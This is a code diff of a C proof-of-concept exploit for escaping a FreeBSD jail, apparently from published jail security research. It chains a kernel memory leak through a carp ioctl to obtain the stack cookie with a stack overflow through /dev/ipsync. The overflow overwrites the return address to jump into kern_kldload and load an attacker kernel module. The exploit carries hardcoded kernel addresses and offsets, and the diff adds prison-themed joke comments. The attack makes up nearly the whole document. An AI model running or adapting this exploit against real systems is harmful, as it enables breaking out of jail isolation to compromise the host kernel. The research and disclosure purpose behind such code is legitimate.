@@ -16,13 +16,12 @@
 #include <sys/user.h>
 #include <unistd.h>
 
+#define u_32_t unsigned int
+
 #define NUM_CARP_IFS 12
 #define IF_NAME "epair100b"
 
-#define u_32_t unsigned int
-#define LEN 100000
-
-#define LINKER_LOAD_FILE_ADDRESS 0xffffffff80af5b26
+#define KERN_KLDLOAD_ADDRESS 0xffffffff80af7af0
 
 typedef struct synchdr {
   u_32_t sm_magic; /* magic */
@@ -61,28 +60,6 @@ service devfs restart
 service jail restart prisonbreak
 */
 
-void cyclic(char* buf, size_t len) {
-  const char set1[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
-  const char set2[] = "abcdefghijklmnopqrstuvwxyz";
-  const char set3[] = "0123456789";
-
-  size_t pos = 0;
-
-  for (size_t i = 0; i < sizeof(set1) - 1; i++) {
-    for (size_t j = 0; j < sizeof(set2) - 1; j++) {
-      for (size_t k = 0; k < sizeof(set3) - 1; k++) {
-        if (pos + 3 > len) return;
-
-        buf[pos++] = set1[i];
-        buf[pos++] = set2[j];
-        buf[pos++] = set3[k];
-
-        if (pos >= len) return;
-      }
-    }
-  }
-}
-
 unsigned long get_td() {
   int mib[4];
   struct kinfo_proc kp;
@@ -107,7 +84,14 @@ unsigned long get_td() {
   return (unsigned long)kp.ki_tdaddr;
 }
 
-void* exploit(void* arg) {
+void* prisonbreak(void* arg) {
+  /*
+   *
+   * 1. Get the stack cookie through a kernel memory leak bug
+   *
+   * See https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/50
+   */
+
   int sock;
   struct carpreq carpr_set;
   struct carpreq carpr_get[NUM_CARP_IFS];
@@ -152,7 +136,8 @@ void* exploit(void* arg) {
   }
 
   // Enumerate the carp interfaces...
-  // and leak some kernel memory while we're at it
+  // and leak some kernel memory while we're at it,
+  // i.e. get an unsuspecting prison guard's access badge.
   if (ioctl(sock, SIOCGVH, (caddr_t)&ifr_get) == -1) {
     perror("ioctl");
     exit(1);
@@ -166,6 +151,13 @@ void* exploit(void* arg) {
 
   close(sock);
 
+  /*
+   *
+   * 2. Use the retrieved stack cookie in a stack smash attack
+   *
+   * https://github.com/iljavs/FreeBSD-Jail-Security-Research/issues/13
+   */
+
   int fd = open("/dev/ipsync", O_RDWR);
 
   if (fd < 0) {
@@ -178,27 +170,20 @@ void* exploit(void* arg) {
   // to overflow the stack with data we control. The calculated length accounts
   // for other locals, padding, the stack cookie, saved registers, the caller's
   // frame pointer and finally the saved return address.
+  // In other words: we need to dig a long enough tunnel.
   int len = 2896;
   synchdr_t* header = malloc(len);
-
-  // Clear the buffer
-  // memset(header, 0, len);
 
   // Fill the buffer with some easily recognizable bogus data (ASCII 'A')
   memset(header, 0x41, len);
 
-  // Fill the buffer with cyclic data to make it easy to calculate offsets
-  // cyclic((char *)header, len);
-
   unsigned long* kernel_module_path = (unsigned long*)(header + sizeof(synchdr_t));
   strcpy((char*)kernel_module_path, "./prisonbreak.ko");
-
-  // unsigned long *arguments = (unsigned long *)(header + sizeof(synchdr_t) +
-  // 500);
 
   // Restore the stack cookie at the location we know it should go using the
   // value extracted earlier to please the stack protection checker 2048 + 32 =
   // 2080 (start of our overflow) + 752 bytes = 2832
+  // i.e. use the badge we got off that guard.
   int stack_cookie_offset = 2832;
   unsigned long* ptr = (unsigned long*)((char*)header + stack_cookie_offset);
   *ptr = stack_cookie;
@@ -209,7 +194,7 @@ void* exploit(void* arg) {
   *ptr = get_td();
 
   // Overwrite the address where kern_kldload is going to read the string
-  // containing our custom kernel module path from
+  // containing our custom kernel module path
   int kernel_module_path_offset = 2864;
   ptr = (unsigned long*)((char*)header + kernel_module_path_offset);
   *ptr = (unsigned long)kernel_module_path;
@@ -224,21 +209,24 @@ void* exploit(void* arg) {
   ptr = (unsigned long*)((char*)header + rbp_offset);
   *ptr = 0xfffffe0070e09cc0;
 
-  // Overwrite the return address to jump to something we can use, e.g.
-  // `linker_load_file()`. 2048 + 32 = 2080 (start of our overflow) + 808 bytes
+  // Overwrite the return address to jump into something we can use, e.g.
+  // `kern_kldload()`. 2048 + 32 = 2080 (start of our overflow) + 808 bytes
   // = 2888
   int return_address_offset = 2888;
   ptr = (unsigned long*)((char*)header + return_address_offset);
-  unsigned long kern_kldload = 0xffffffff80af7af0;
+  unsigned long kern_kldload = KERN_KLDLOAD_ADDRESS;
+  // NOTE: We jump 69 bytes *into* kern_kldload to bypass some checks, i.e.
+  // making sure none of the guards spot us.
   unsigned long jump_to_address = kern_kldload + 69;
   *ptr = jump_to_address;
 
   // Populate the header with expected values so we pass all the checks and get
-  // to where we need to be.
+  // to where we need to be, i.e. have another inmate create a diversion by setting their mattress on fire.
   header->sm_magic = htonl(0x0FF51DE5);
   header->sm_v = 4;
   header->sm_p = 4;
-  header->sm_cmd = 1;
+  header->sm_cmd = 1;  // 0 here causes a NAT expire event to trigger at some point in the future,
+                       // resulting in a host panic. We don't want the alarm to go off.
   header->sm_table = 0;
   header->sm_num = 0;
   header->sm_rev = 0;
@@ -251,17 +239,16 @@ void* exploit(void* arg) {
     printf("errno: %d\n", errno);
   }
 
-  printf("Exploit FAILED\n");
+  printf("FAILED to break out of prison. You have died of this and Terry.\n");
   close(fd);
 
-  return NULL;  // or: pthread_exit(NULL);
+  return NULL;
 }
 
 int main() {
-  pthread_t tid;
-  int argument = 42;
+  pthread_t thread1;
 
-  if (pthread_create(&tid, NULL, exploit, &argument) != 0) {
+  if (pthread_create(&thread1, NULL, prisonbreak, NULL) != 0) {
     perror("pthread_create");
     return 1;
   }
